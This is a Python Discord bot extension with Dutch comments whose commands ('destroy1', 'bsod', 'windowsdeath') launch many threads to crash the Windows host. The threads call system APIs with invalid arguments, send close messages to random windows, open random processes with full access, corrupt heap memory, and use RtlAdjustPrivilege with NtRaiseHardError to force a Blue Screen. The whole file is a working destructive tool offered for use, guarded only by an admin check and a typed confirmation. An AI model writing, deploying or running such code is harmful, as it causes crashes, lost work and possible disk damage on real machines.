import discord
from discord.ext import commands
import asyncio
import threading
import time
import random
import ctypes
import ctypes.wintypes
import os
import sys
from datetime import datetime

class WindowsAPICrash(commands.Cog):  # 👈 NAAM GEWIJZIGD van MachineCrash naar WindowsAPICrash
    def __init__(self, bot):
        self.bot = bot
        self.crash_threads = []
        self.is_crashing = False
        self.warning_given = False

    def has_admin_permissions(self, ctx):
        """Controleert of de gebruiker admin rechten heeft"""
        return ctx.author.guild_permissions.administrator

    async def safety_check(self, ctx):
        """Veiligheidscheck voordat crash wordt gestart"""
        if not self.has_admin_permissions(ctx):
            await ctx.send("❌ Je hebt geen administrator rechten!")
            return False

        if not self.warning_given:
            embed = discord.Embed(
                title="⚠️ **EXTREME WAARSCHUWING** ⚠️",
                description="Deze **WINDOWS API CRASH** command kan je VM **BINNEN 30 SECONDEN** laten crashen!",
                color=discord.Color.red()
            )
            embed.add_field(name="💀 Risico's", value="• Blue Screen of Death (BSOD)\n• Systeem crasht gegarandeerd\n• Alle niet-opgeslagen werk kwijt\n• Forceer herstart nodig\n• Kan virtuele schijf beschadigen", inline=False)
            embed.add_field(name="✅ ALLEEN GEBRUIKEN", value="Op eigen risico! Sla AL je werk op!", inline=False)
            embed.set_footer(text="Typ 'JA' binnen 10 seconden om door te gaan")
            
            await ctx.send(embed=embed)
            
            def check(m):
                return m.author == ctx.author and m.content.upper() == 'JA'
            
            try:
                await self.bot.wait_for('message', timeout=10.0, check=check)
                self.warning_given = True
                return True
            except:
                await ctx.send("❌ Geannuleerd. Je hebt niet 'JA' getypt.")
                return False
        
        return True

    def api_crash_attack(self, thread_id):
        """
        Windows API CRASH - Roept systeemfuncties aan met ongeldige parameters
        Gebaseerd op echte crash technieken die Blue Screens veroorzaken
        """
        # Windows API functies laden
        try:
            kernel32 = ctypes.windll.kernel32
            user32 = ctypes.windll.user32
            ntdll = ctypes.windll.ntdll
            advapi32 = ctypes.windll.advapi32
        except Exception as e:
            print(f"Fout bij laden API: {e}")
            return

        while self.is_crashing:
            try:
                # === TECHNIEK 1: Ongeldige geheugenallocatie ===
                kernel32.VirtualAlloc(
                    None,
                    0xFFFFFFFFFFFFFFFF,
                    0x3000,
                    0x40
                )

                # === TECHNIEK 2: Corrupte vensterhandles ===
                for _ in range(100):
                    random_handle = random.randint(1, 999999)
                    user32.SetWindowTextW(
                        random_handle,
                        "CRASH" * 1000
                    )
                    
                    user32.SendMessageW(
                        random_handle,
                        0x0010,
                        0,
                        0
                    )

                # === TECHNIEK 3: Ongeldige bestandshandelingen ===
                kernel32.CreateFileW(
                    "COM1" + "\\" * 1000,
                    0x80000000,
                    0,
                    None,
                    3,
                    0,
                    None
                )

                # === TECHNIEK 4: Blue Screen forceren ===
                try:
                    hToken = ctypes.wintypes.HANDLE()
                    advapi32.OpenProcessToken(
                        kernel32.GetCurrentProcess(),
                        0x20,
                        ctypes.byref(hToken)
                    )
                    
                    ntdll.RtlAdjustPrivilege(
                        19,
                        1,
                        0,
                        ctypes.byref(ctypes.c_bool())
                    )
                    
                    response = ctypes.c_uint()
                    ntdll.NtRaiseHardError(
                        0xC000021A,
                        0,
                        0,
                        0,
                        6,
                        ctypes.byref(response)
                    )
                except:
                    pass

                # === TECHNIEK 5: Corrupte proces handles ===
                for _ in range(50):
                    kernel32.OpenProcess(
                        0x1FFFFF,
                        True,
                        random.randint(1, 99999)
                    )

                # === TECHNIEK 6: Heap corruptie ===
                heap = kernel32.GetProcessHeap()
                for _ in range(1000):
                    ptr = kernel32.HeapAlloc(heap, 0, 1024 * 1024)
                    if ptr:
                        ctypes.memset(ptr + 1024 * 1024, 0x41, 100)
                        kernel32.HeapFree(heap, 0, ptr)

                # === TECHNIEK 7: Exception handling misbruik ===
                try:
                    kernel32.AddVectoredExceptionHandler(
                        1,
                        0xFFFFFFFF
                    )
                except:
                    pass

                # === TECHNIEK 8: Thread locale opslag corruptie ===
                for _ in range(100):
                    tls_index = kernel32.TlsAlloc()
                    if tls_index != 0xFFFFFFFF:
                        kernel32.TlsSetValue(
                            tls_index,
                            0xFFFFFFFFFFFFFFFF
                        )

                # === TECHNIEK 9: Atomaire operaties misbruik ===
                kernel32.InterlockedExchange(
                    ctypes.byref(ctypes.c_long(0)),
                    0xFFFFFFFF
                )

                # === TECHNIEK 10: Kritieke sectie corruptie ===
                critical_section = ctypes.c_byte(40)
                kernel32.InitializeCriticalSection(ctypes.byref(critical_section))
                kernel32.EnterCriticalSection(ctypes.byref(critical_section))
                kernel32.LeaveCriticalSection(ctypes.byref(critical_section))
                ctypes.memset(ctypes.byref(critical_section), 0xCC, 40)

                # === TECHNIEK 11: Window class misbruik ===
                wnd_class = ctypes.create_string_buffer(1000)
                user32.GetClassNameW(
                    0xFFFFFFFF,
                    wnd_class,
                    1000
                )

                # === TECHNIEK 12: Schildpad attack ===
                start = time.time()
                while time.time() - start < 1:
                    kernel32.GetTickCount()
                    user32.GetMessageTime()
                    kernel32.GetCurrentProcessId()

                time.sleep(0.01)

            except Exception:
                continue

    @commands.command(name='destroy1', aliases=['windowsdeath', 'bsod'])
    async def api_crash(self, ctx, intensiteit: int = 100):
        """
        WINDOWS API CRASH - Roept systeemfuncties aan met ongeldige parameters
        Gebruik: !api_crash
        Effect: Blue Screen of Death binnen 30-60 seconden
        """
        if not await self.safety_check(ctx):
            return

        if os.name != 'nt':
            await ctx.send("❌ Deze command werkt alleen op Windows!")
            return

        intensiteit = max(1, min(100, intensiteit))
        base_threads = max(4, os.cpu_count() or 4)
        threads_to_use = int(base_threads * (intensiteit / 25))

        await ctx.send(f"🪟 **WINDOWS API CRASH**")
        await ctx.send(f"🔥 {threads_to_use} API crash threads worden gestart...")
        await ctx.send("⚠️ **BLUE SCREEN OF DOOD BINNENKORT!**")

        self.is_crashing = True

        for i in range(threads_to_use):
            thread = threading.Thread(target=self.api_crash_attack, args=(i,), daemon=True)
            thread.start()
            self.crash_threads.append(thread)

        embed = discord.Embed(
            title="🪟🪟🪟 **WINDOWS API CRASH GESTART** 🪟🪟🪟",
            description=f"✅ {len(self.crash_threads)} API crash threads actief!",
            color=discord.Color.red()
        )
        embed.add_field(name="🔥 Intensiteit", value=f"**{intensiteit}%**", inline=True)
        embed.add_field(name="🧵 API Threads", value=f"{threads_to_use}", inline=True)
        embed.add_field(name="💀 Verwachte tijd", value="**30-60 seconden tot BSOD**", inline=True)
        embed.add_field(name="⚠️ WAARSCHUWING", value="Blue Screen of Death is onvermijdelijk!", inline=False)

        await ctx.send(embed=embed)

        self.bot.loop.create_task(self.crash_monitor(ctx))

    async def crash_monitor(self, ctx):
        """Monitort de crash status"""
        start_time = time.time()
        warning_given = False

        while self.is_crashing:
            await asyncio.sleep(5)

            if not self.is_crashing:
                break

            elapsed = time.time() - start_time

            if elapsed > 20 and not warning_given:
                await ctx.send("⚠️ **20 SECONDEN** - Blue Screen zou elk moment moeten verschijnen!")
                warning_given = True
            elif elapsed > 40:
                await ctx.send("💀 **40 SECONDEN** - Als er nog geen BSOD is, wordt het tijd voor een noodstop!")
                break

    @commands.command(name='stop_api_crash', aliases=['stop_api', 'stop_bsod'])
    async def stop_api_crash(self, ctx):
        """
        Stopt de API crash (ALS HET NOG KAN)
        """
        if not self.has_admin_permissions(ctx):
            await ctx.send("❌ Je hebt geen administrator rechten!")
            return

        if not self.is_crashing:
            await ctx.send("❌ Er draait geen API crash!")
            return

        await ctx.send("🛑 **NOODSTOP GESTART** - Bezig met stoppen van API crash...")

        self.is_crashing = False

        for _ in range(3):
            await asyncio.sleep(1)

        self.crash_threads.clear()
        self.warning_given = False

        await ctx.send("✅ **API CRASH GESTOPT** - Systeem zou moeten herstellen...")

    @commands.command(name='api_status')
    async def api_status(self, ctx):
        """Toont status van API crash"""
        if not self.has_admin_permissions(ctx):
            await ctx.send("❌ Je hebt geen administrator rechten!")
            return

        embed = discord.Embed(
            title="📊 **API CRASH STATUS**",
            color=discord.Color.red() if self.is_crashing else discord.Color.blue()
        )

        embed.add_field(name="💀 Crash actief", value="✅ JA" if self.is_crashing else "❌ Nee", inline=True)
        embed.add_field(name="🧵 Actieve threads", value=f"{len(self.crash_threads)}", inline=True)
        embed.add_field(name="🪟 Windows", value=f"{os.name}", inline=True)

        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            embed.add_field(name="👑 Admin rechten", value="✅ Ja" if is_admin else "❌ Nee", inline=True)
        except:
            embed.add_field(name="👑 Admin rechten", value="❌ Onbekend", inline=True)

        await ctx.send(embed=embed)

    @commands.command(name='api_help')
    async def api_help(self, ctx):
        """Toont API crash commands"""
        embed = discord.Embed(
            title="🪟 Windows API Crash Commands",
            description="Alle beschikbare API crash commando's",
            color=discord.Color.purple()
        )

        embed.add_field(
            name="💀 Crash Starten",
            value="`!api_crash` - Start Windows API crash\n`!windowsdeath` - Alias\n`!bsod` - Alias",
            inline=False
        )

        embed.add_field(
            name="🛑 Crash Stoppen",
            value="`!stop_api_crash` - Stop API crash\n`!stop_bsod` - Alias",
            inline=False
        )

        embed.add_field(
            name="📊 Informatie",
            value="`!api_status` - Toon API status\n`!api_help` - Dit help menu",
            inline=False
        )

        embed.add_field(
            name="⚙️ Hoe het werkt",
            value="• **12 API crash technieken** tegelijk\n• Ongeldige geheugenallocatie\n• Corrupte vensterhandles\n• Heap corruptie\n• Blue Screen forcing\n• En meer!",
            inline=False
        )

        embed.set_footer(text="⚠️ Garandeert Blue Screen of Death binnen 60 seconden!")

        await ctx.send(embed=embed)

# 👈 SETUP FUNCTIE AANGEPAST met nieuwe class naam
async def setup(bot):
    await bot.add_cog(WindowsAPICrash(bot))